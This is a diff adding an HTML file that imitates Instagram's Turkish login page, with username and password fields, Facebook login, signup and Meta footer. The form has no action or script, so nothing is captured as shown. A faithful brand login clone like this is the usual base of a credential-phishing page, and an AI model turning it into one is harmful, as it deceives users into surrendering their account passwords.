@@ -1,0 +1,185 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background-color: #000;
+      font-family: Arial, sans-serif;
+      color: #fff;
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      flex-direction: column;
+    }
+
+    .login-box {
+      background-color: #111;
+      border: 1px solid #262626;
+      padding: 40px;
+      width: 350px;
+      text-align: center;
+    }
+
+    .login-box h1 {
+      font-family: 'Brush Script MT', cursive;
+      font-size: 48px;
+      margin-bottom: 30px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin: 6px 0;
+      border: 1px solid #262626;
+      background-color: #000;
+      color: #fff;
+      border-radius: 3px;
+    }
+
+    .login-box button {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      background-color: #385185;
+      border: none;
+      border-radius: 5px;
+      color: #fff;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    .separator {
+      display: flex;
+      align-items: center;
+      margin: 20px 0;
+      color: #a8a8a8;
+      font-size: 13px;
+    }
+
+    .separator::before,
+    .separator::after {
+      content: "";
+      flex: 1;
+      border-bottom: 1px solid #262626;
+      margin: 0 10px;
+    }
+
+    .facebook-login {
+      color: #0095f6;
+      font-weight: bold;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
+      cursor: pointer;
+    }
+
+    .forgot {
+      margin-top: 15px;
+      font-size: 12px;
+      cursor: pointer;
+    }
+
+    .signup-box {
+      background-color: #111;
+      border: 1px solid #262626;
+      margin-top: 10px;
+      padding: 20px;
+      width: 350px;
+      text-align: center;
+      font-size: 14px;
+    }
+
+    .signup-box a {
+      color: #0095f6;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    footer {
+      margin-top: 30px;
+      text-align: center;
+      font-size: 12px;
+      color: #a8a8a8;
+      max-width: 900px;
+      line-height: 2;
+    }
+
+    footer a {
+      margin: 0 6px;
+      color: #a8a8a8;
+      text-decoration: none;
+    }
+
+    footer select {
+      background-color: #000;
+      color: #a8a8a8;
+      border: none;
+      font-size: 12px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <h1>Instagram</h1>
+      <form>
+        <input type="text" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+        <input type="password" placeholder="Şifre" required>
+        <button type="submit">Giriş yap</button>
+      </form>
+      <div class="separator">YA DA</div>
+      <div class="facebook-login">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_(2019).png" alt="Facebook" width="18">
+        Facebook ile Giriş Yap
+      </div>
+      <div class="forgot">Şifreni mi unuttun?</div>
+    </div>
+
+    <div class="signup-box">
+      Hesabın yok mu? <a href="#">Kaydol</a>
+    </div>
+
+    <footer>
+      <div>
+        <a href="#">Meta</a>
+        <a href="#">Hakkında</a>
+        <a href="#">Blog</a>
+        <a href="#">İş Fırsatları</a>
+        <a href="#">Yardım</a>
+        <a href="#">API</a>
+        <a href="#">Gizlilik</a>
+        <a href="#">Koşullar</a>
+        <a href="#">Konumlar</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Meta AI</a>
+        <a href="#">Meta AI Makaleleri</a>
+        <a href="#">Threads</a>
+        <a href="#">Kişi Yükleme ve Hesabı Olmayan Kişiler</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      <div>
+        <select>
+          <option>Türkçe</option>
+          <option>English</option>
+          <option>Deutsch</option>
+          <option>Français</option>
+        </select>
+      </div>
+      <div>
+        © 2025 Instagram from Meta
+      </div>
+    </footer>
+  </div>
+</body>
+</html>
